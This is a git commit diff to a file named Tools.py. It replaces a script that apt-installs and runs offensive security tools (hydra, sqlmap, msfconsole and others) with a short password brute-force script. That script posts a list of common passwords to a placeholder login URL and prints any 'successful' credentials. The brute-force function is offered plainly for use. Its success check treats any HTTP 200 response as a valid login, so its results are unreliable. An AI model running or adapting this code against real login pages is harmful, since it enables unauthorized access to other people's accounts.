9def5485a5bf1a78b81018948d32b9afa172e5bf
vIPERexe2 <148722243+vIPERexe2@users.noreply.github.com>
2023-10-31 18:56:47 +0200

    Update Tools.py

--- Tools.py
+++ Tools.py
@@ -1,39 +1,32 @@
-import subprocess
+import requests
 
-def install_tool(tool_name):
-    try:
-        subprocess.check_output(['apt', 'install', tool_name, '-y'])
-        print(f"{tool_name} installed successfully!")
-    except subprocess.CalledProcessError as e:
-        print(f"Error installing {tool_name}: {e}")
+def bruteforce_login(username):
+    passwords = ['password', '123456', 'qwerty', 'admin', 'letmein']  # List of common passwords to try
+    
+    for password in passwords:
+        try:
+            # Make a request to the login endpoint with the current username and password
+            response = requests.post('https://example.com/login', data={'username': username, 'password': password})
+            
+            response.raise_for_status()  # Raise an exception if the response status code is not 200
+            
+            if response.status_code == 200:
+                print(f"Login successful! Username: {username}, Password: {password}")
+                break  # Exit the loop if login is successful
+            else:
+                print(f"Login failed! Username: {username}, Password: {password}")
+        
+        except requests.exceptions.RequestException as e:
+            print(f"An error occurred: {e}")
+    
+    print("Bruteforce attack complete.")
 
-def run_tool(tool_name):
-    try:
-        subprocess.check_output([tool_name])
-    except FileNotFoundError:
-        print(f"{tool_name} not found. Please make sure it is installed.")
-    except subprocess.CalledProcessError as e:
-        print(f"Error running {tool_name}: {e}")
+try:
+    # Prompt the user to enter a login username
+    username = input("Enter the login username: ")
+    
+    # Call the bruteforce_login function with the provided username
+    bruteforce_login(username)
 
-def install_and_run_tools(tools):
-    for tool in tools:
-        install_tool(tool)
-        run_tool(tool)
-
-if __name__ == "__main__":
-    # List of tools to install and run
-    tools = [
-        "setoolkit",
-        "hydra",
-        "aircrack-ng",
-        "sqlmap",
-        "john",
-        "hashcat",
-        "wireshark",
-        "nmap",
-        "owasp-zap",
-        "msfconsole"
-    ]
-
-    # Install and run each tool
-    install_and_run_tools(tools)
+except Exception as e:
+    print(f"An error occurred: {e}")
